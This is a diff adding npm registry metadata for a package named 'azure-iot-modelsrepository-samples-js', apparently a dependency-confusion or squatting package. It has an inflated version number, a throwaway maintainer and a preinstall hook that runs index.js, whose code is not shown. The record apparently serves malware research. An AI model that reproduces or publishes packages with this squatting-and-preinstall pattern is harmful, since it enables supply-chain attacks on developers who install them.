@@ -1,0 +1,62 @@
+{
+    "_id": "azure-iot-modelsrepository-samples-js",
+    "name": "azure-iot-modelsrepository-samples-js",
+    "dist-tags": {
+        "latest": "99.10.9"
+    },
+    "versions": {
+        "99.10.9": {
+            "name": "azure-iot-modelsrepository-samples-js",
+            "version": "99.10.9",
+            "description": "azure package",
+            "main": "index.js",
+            "scripts": {
+                "test": "echo 'error no test specified' && exit 1",
+                "preinstall": "node index.js"
+            },
+            "author": "",
+            "License": "ISC",
+            "_id": "azure-iot-modelsrepository-samples-js@99.10.9",
+            "_nodeVersion": "16.14.2",
+            "_npmVersion": "8.5.0",
+            "dist": {
+                "integrity": "sha512-k4152lF7iy4xfPXt5fUrJT8G+DQZG+z77EZ71536pJUvDwYdykBnxE6zHYbPvD21YcYaAPhuAT5dRVQMiV3AMg==",
+                "shasum": "611be349130b4b022afce29e84e997928af8533b",
+                "tarball": "https://registry.npmjs.org/azure-iot-modelsrepository-samples-js/-/azure-iot-modelsrepository-samples-js-99.10.9.tgz",
+                "fileCount": 2,
+                "unpackedSize": 5089,
+                "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiOqHlACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2VmqqJA//aOmZTxrtvNBQXzbnrhYdqdUdiya6ra8uT40bW3hhmcp31LsG\r\nyThHw1AnuYuq191D+mQgAeKYlOXUykVAgP2Bnc6TcsCJO0JoPg4xWq4QBWhh\r\nFlW56BsRrism6sIhTf9bwjkO0b33j2prYALcDQoMwVyIBRG7e6/+ErH6xEA7\r\nGS45l0uflBk4Gbr+Kbrd9YzRlUFzwYWrajzMBmSktJt9Syh7260ENybNy4XQ\r\nivYAEWhFwIncczCVLT0po+nWtuy68onGHeuZcZqfFTiQvEqsI/QxGP0YEdQ6\r\n/DRpJboW5iexsrY8bAwksOaxAjC83I/hlA+Bm/af2JGscpHKxo4vHC/xRw0+\r\nbXPdXwACAainhINKwleJNAo3K3RXVyNGLar0wHVScaptV9Oh2qCdPrKd2X2m\r\nU+lgOJ81yGsvfCCBaM1PsdKYI6VwqMzNRuaF+zzecKeU4V8H8BB3u+ArDWzF\r\n0LpIiox1aCjSktt+aiyTHJVH9LzadsT+/0jES4Vm0jp75Odzrd3JEGlWM16H\r\nxOJFi5RTt8hkD2nFqAPMV7euFGSP0Fd5e1Tdw+NNEarCmH74x6psww5C7q4H\r\n8UAFufv5FBn/0hhNCF5BQRcr8epcuK/C5v4y2zwV3qOzgysqexzhnSwhAFla\r\nwx0zIAwHwbQpafyaEooKoNwkCai3DWr6SmI=\r\n=jseV\r\n-----END PGP SIGNATURE-----\r\n"
+            },
+            "_npmUser": {
+                "name": "si5zsj3f",
+                "email": "si5zsj3f@rt11.ml"
+            },
+            "directories": {},
+            "maintainers": [
+                {
+                    "name": "si5zsj3f",
+                    "email": "si5zsj3f@rt11.ml"
+                }
+            ],
+            "_npmOperationalInternal": {
+                "host": "s3://npm-registry-packages",
+                "tmp": "tmp/azure-iot-modelsrepository-samples-js_99.10.9_1648009701741_0.6639871428466819"
+            },
+            "_hasShrinkwrap": false
+        }
+    },
+    "time": {
+        "created": "2022-03-23T04:28:21.740Z",
+        "99.10.9": "2022-03-23T04:28:21.904Z",
+        "modified": "2022-03-23T04:28:22.007Z"
+    },
+    "maintainers": [
+        {
+            "name": "si5zsj3f",
+            "email": "si5zsj3f@rt11.ml"
+        }
+    ],
+    "description": "azure package",
+    "readme": "ERROR: No README data found!",
+    "readmeFilename": ""
+}
